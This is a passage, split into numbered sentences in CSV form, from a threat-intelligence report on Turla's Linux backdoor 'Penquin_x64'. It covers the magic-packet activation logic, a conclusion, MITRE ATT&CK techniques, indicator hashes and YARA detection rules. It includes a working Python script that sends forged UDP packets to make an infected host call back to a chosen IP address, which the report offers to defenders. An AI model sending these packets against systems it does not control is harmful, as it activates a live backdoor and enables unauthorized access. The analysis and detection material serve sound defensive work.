Number,Content
Sentence 228,"In the figure, the values of “Penquin_x64” are reported; the bits marked with an ‘x’ can be chosen as desired, as long as they match the conditions represented in the bottom section of the figure."
Sentence 229,"Figure 8 - Portion of code of “Penquin_x64” executed when a valid incoming activation packet is received
Another interesting portion of the code of “Penquin_x64” is reported in Figure 8."
Sentence 230,These instructions are executed when the conditions we discussed are matched.
Sentence 231,"However, it is important to note that final_check_1 must be equal to 1Dh in order to be accepted by this sample."
Sentence 232,Such value was specified as a command line parameter in “Penquin” version and it was hardcoded in “Penquin_x64”.
Sentence 233,Figure 8 also reports an important detail about final_check_2.
Sentence 234,This value is used as a status flag.
Sentence 235,"Whenever the execution reaches the final basic block, the sample changes its internal status according to the value of final_check_2 and stores it into the register r15d."
Sentence 236,This value depends on the values marked with ‘x’ of the second DWORD of the packet.
Sentence 237,This means that a correctly formatted activation packet is accepted only if the state of the stored final_check_2 value is different from the one generated from the incoming packet.
Sentence 238,However final_check_2 seems to have only two possible values that are 0 or 2.
Sentence 239,"Since the status is zero-initialized, the first packet to activate Penquin must have final_check_2 equal to 2."
Sentence 240,"
4.4 Is the Penquin in the house?"
Sentence 241,"With the knowledge and understanding of the portion of binary code related to the magic packet, we have been able to forge packets that are compliant with all the conditions of the Penquin protocol."
Sentence 242,The python code reported below triggers the sample to connect back to an IP address that is encoded inside the payload.
Sentence 243,It can be used by blue teams to check if their Linux servers are infected by this version of “Penquin_x64”.
Sentence 244,"import socket
tc_remote_port = 0x9999
outgoing_if = 192.168.202.1 # local IP
remote_tc_host = 192.168.202.130 # potentially infected machine IP
#send UDP packet with final_check2 equal to 2 and callback IP address equal to 10.11.60.129
tc_local_port = 65105
tc_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
tc_sock.bind((outgoing_if, tc_local_port))
tc_sock.sendto(b\x4a\x0a\x3c\x83\x60\x95\xbd\xbd, (remote_tc_host,tc_remote_port))
#send UDP packet with final_check2 equal to 0 and callback IP address equal to 10.188.60.129
tc_local_port = 30846
tc_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
tc_sock.bind((outgoing_if, tc_local_port))
tc_sock.sendto(b\x0a\xbc\x3c\x80\x62\x85\xbd\xbd, (remote_tc_host,tc_remote_port))
The variables that can be freely configured are: tc_remote_port, outgoing_if and remote_tc_host."
Sentence 245,"Since we are unable to establish the value of the status flag in advance, two packets are sent in order to trigger the connection to one of the two private IP addresses 10.11.60.129 or 10.188.60.129, that should be used by the system administrators to monitor the call back home traffic of “Penquin_x64”."
Sentence 246,"
5."
Sentence 247,"CONCLUSION
This report is based on the outcome of a deep technical analysis of a set of malware samples that have been uploaded to a multi-scanner service in the last few years."
Sentence 248,"Since we didn’t have the chance to investigate an actual incident involving them, or to analyse a single compromised machine, we have not been able to collect and analyse additional context information that could add important information about the victimology, the TTPs of the threat actor and the timeline of the events."
Sentence 249,The analysis we performed proved that Turla continued to develop new versions of “Penquin_x64” at least up to April 2016.
Sentence 250,"Furthermore, it revealed the enormous effort put in place by the threat actor to avoid the activation of the backdoor not controlled by themselves."
Sentence 251,"Nevertheless, we have been able to completely understand the network protocol that is used, and to build a tool that is able to activate the backdoor and call back an IP address that we can control."
Sentence 252,This tool can be used by system administrators for defensive purposes.
Sentence 253,"
6."
Sentence 254,"MITRE ATT&CK TTPs
T1059
Command-Line Interface
Command-line interfaces provide a way of interacting with computer systems and is a common feature across many types of operating system platforms."
Sentence 255,"One example command-line interface on Windows systems is cmd, which can be used to perform a number of tasks including execution of other software."
Sentence 256,"Command-line interfaces can be interacted with locally or remotely via a remote desktop application, reverse shell session, etc."
Sentence 257,Commands that are executed run with the current permission level of the command-line interface process unless the command includes process invocation that changes permissions context for that execution (e.g.
Sentence 258,Scheduled Task).
Sentence 259,"T1205
Port Knocking
Port Knocking is a well-established method used by both defenders and adversaries to hide open ports from access."
Sentence 260,"To enable a port, an adversary sends a series of packets with certain characteristics before the port will be opened."
Sentence 261,"Usually this series of packets consists of attempted connections to a predefined sequence of closed ports, but can involve unusual flags, specific strings or other unique characteristics."
Sentence 262,"After the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software."
Sentence 263,"T1105
Remote File Copy
Files may be copied from one system to another to stage adversary tools or other files over the course of an operation."
Sentence 264,Files may be copied from an external adversary-controlled system through the Command and Control channel to bring tools into the victim network or through alternate protocols with another tool such as FTP.
Sentence 265,"Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp."
Sentence 266,"T1094
Custom Command and Control Protocol
Adversaries may communicate using a custom command and control protocol instead of encapsulating commands/data in an existing Standard Application Layer Protocol."
Sentence 267,Implementations include mimicking well-known protocols or developing custom protocols (including raw sockets) on top of fundamental protocols provided by TCP/IP/another standard network stack.
Sentence 268,"T1024
Custom Cryptographic Protocol
Adversaries may use a custom cryptographic protocol or algorithm to hide command and control traffic."
Sentence 269,"A simple scheme, such as XOR-ing the plaintext with a fixed key, will produce a very weak ciphertext."
Sentence 270,"T1032
Standard Cryptographic Protocol
Adversaries may explicitly employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol."
Sentence 271,"Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if necessary secret keys are encoded and/or generated within malware samples/configuration files."
Sentence 272,"T1158
Hidden Files and Directories
To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a ‘hidden’ file."
Sentence 273,These files don’t show up when a user browses the file system with a GUI or when using normal commands on the command line.
Sentence 274,Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (dir /a for Windows and ls –a for Linux and macOS).
Sentence 275,"T1222
File and Directory Permissions Modification
File and directory permissions are commonly managed by discretionary access control lists (DACLs) specified by the file or directory owner."
Sentence 276,"File and directory DACL implementations may vary by platform, but generally explicitly designate which users/groups can perform which actions (ex: read, write, execute, etc.)."
Sentence 277,"
7."
Sentence 278,"INDICATORS OF COMPROMISE
Hashes
1d5e4466a6c5723cd30caf8b1c3d33d1a3d4c94c25e2ebe186c02b8b41daf905
8dc3d053e5008ab92a17dc47fed43213a9873db0
0994d9deb50352e76b0322f48ee576c6
3e138e4e34c6eed3506efc7c805fce19af13bd62aeb35544f81f111e83b5d0d4 04686b0d2fdafa7cb6c17adc551abade334d7b85
14ecd5e6fc8e501037b54ca263896a11
8856a68d95e4e79301779770a83e3fad8f122b849a9e9e31cfe06bf3418fa667 7f043eb95d74d051ac780aee52ebf1c497c43060
19fbd8cbfb12482e8020a887d6427315
2dabb2c5c04da560a6b56dbaa565d1eab8189d1fa4a85557a22157877065ea08
4594453e2e4002101481dc44f203d3ffebe079ae
edf900cebb70c6d1fcab0234062bfc28
5a204263cac112318cd162f1c372437abf7f2092902b05e943e8784869629dd8 09580f1deb096bb50d082bd169271d41756adf73
ea06b213d5924de65407e8931b1e4326
d49690ccb82ff9d42d3ee9d7da693fd7d302734562de088e9298413d56b86ed0 9d133d7e0616573a7d1c822cc878149e7aa7bad6
e079ec947d3d4dacb21e993b760a65dc
8ccc081d4940c5d8aa6b782c16ed82528c0885bbb08210a8d0a8c519c54215bc 0675329cfa4d13ee35f74c1cc236bc630b7de464
ad6731c123c4806f91e1327f35194722
67d9556c695ef6c51abf6fbab17acb3466e3149cf4d20cb64d6d34dc969b6502
f5a1a9180913bbeb1641af48660fbb756325f91e
b4587870ecf51e8ef67d98bb83bc4be7
d9f2467ff11efae921ec83e074e4f8d2eac7881d76bff60a872a801bd45ce3d5
c67abb20ae5100f12ce084279827632fdbcb222a
7533ef5300263eec3a677b3f0636ae73
"
Sentence 279,"
Yara Rules
rule APT_MAL_LNX_Turla_Apr202004_1 {
meta:
description = Detects Turla Linux malware x64 x32
date = 2020-04-24
hash1 = 67d9556c695ef6c51abf6fbab17acb3466e3149cf4d20cb64d6d34dc969b6502
hash2 = 8ccc081d4940c5d8aa6b782c16ed82528c0885bbb08210a8d0a8c519c54215bc
hash3 = 8856a68d95e4e79301779770a83e3fad8f122b849a9e9e31cfe06bf3418fa667
hash4 = 1d5e4466a6c5723cd30caf8b1c3d33d1a3d4c94c25e2ebe186c02b8b41daf905
hash5 = 2dabb2c5c04da560a6b56dbaa565d1eab8189d1fa4a85557a22157877065ea08
hash6 = 3e138e4e34c6eed3506efc7c805fce19af13bd62aeb35544f81f111e83b5d0d4
hash7 = 5a204263cac112318cd162f1c372437abf7f2092902b05e943e8784869629dd8
hash8 = 8856a68d95e4e79301779770a83e3fad8f122b849a9e9e31cfe06bf3418fa667
hash9 = d49690ccb82ff9d42d3ee9d7da693fd7d302734562de088e9298413d56b86ed0
strings:
$s1 = /root/.hsperfdata ascii fullword
$s2 = Desc| Filename | size |state| ascii fullword
$s3 = VS filesystem: %s ascii fullword
$s4 = File already exist on remote filesystem !"
Sentence 280,"ascii fullword
$s5 = /tmp/.sync.pid ascii fullword
$s6 = rem_fd: ssl  ascii fullword
$s7 = TREX_PID=%u ascii fullword
$s8 = /tmp/.xdfg ascii fullword
$s9 = __we_are_happy__ ascii fullword
$s10 = /root/.sess ascii fullword
$s11 = ZYSZLRTS^Z@@NM@@G_Y_FE ascii fullword
condition:
uint16(0) == 0x457f and
filesize < 5000KB and
4 of them
}
"
Sentence 281,"
APT_MAL_LNX_Turla_Apr202004_1_opcode {
meta:
description = Detects Turla Linux malware x64 x32
date = 2020-04-24
hash1 = 67d9556c695ef6c51abf6fbab17acb3466e3149cf4d20cb64d6d34dc969b6502
hash2 = 8ccc081d4940c5d8aa6b782c16ed82528c0885bbb08210a8d0a8c519c54215bc
hash3 = 8856a68d95e4e79301779770a83e3fad8f122b849a9e9e31cfe06bf3418fa667
hash4 = 1d5e4466a6c5723cd30caf8b1c3d33d1a3d4c94c25e2ebe186c02b8b41daf905
hash5 = 2dabb2c5c04da560a6b56dbaa565d1eab8189d1fa4a85557a22157877065ea08
hash6 = 3e138e4e34c6eed3506efc7c805fce19af13bd62aeb35544f81f111e83b5d0d4
hash7 = 5a204263cac112318cd162f1c372437abf7f2092902b05e943e8784869629dd8
hash8 = 8856a68d95e4e79301779770a83e3fad8f122b849a9e9e31cfe06bf3418fa667
hash9 = d49690ccb82ff9d42d3ee9d7da693fd7d302734562de088e9298413d56b86ed0
strings:
$op0 = { 8D 41 05 32 06 48 FF C6 88 81 E0 80 69 00 } /* Xor string loop_p1 x32*/
$op1 = { 48 FF C1 48 83 F9 49 75 E9 } /* Xor string loop_p2 x32*/
$op2 = { C7 05 9B 7D 29 00 1D 00 00 00 C7 05 2D 7B 29 00 65 74 68 30 C6 05 2A 7B 29 00 00 E8 }
/* Load eth0 interface*/
$op3 = { BF FF FF FF FF E8 96 9D 0A 00 90 90 90 90 90 90 90 90 90 90 89 F0}
/* Opcode exceptions*/
$op4 = { 88 D3 80 C3 05 32 9A C1 D6 0C 08 88 9A 60 A1 0F 08 42 83 FA 08 76 E9 }
/* Xor string loop x64*/
$op5 = { 8B 8D 50 DF FF FF B8 09 00 00 00 89 44 24 04 89 0C 24 E8 DD E5 02 00 } /* Kill call x32 */
$op6 = { 8D 5A 05 32 9A 60 26 0C 08 88 9A 20 F4 0E 08 42 83 FA 48 76 EB } /* Decrypt init str */
$op7 = { 8D 4A 05 32 8A 25 26 0C 08 88 8A 20 F4 0E 08 42 83 FA 08 76 EB} /* Decrypt init str */
condition:
uint16(0) == 0x457f and
filesize < 5000KB and
2 of them
}"
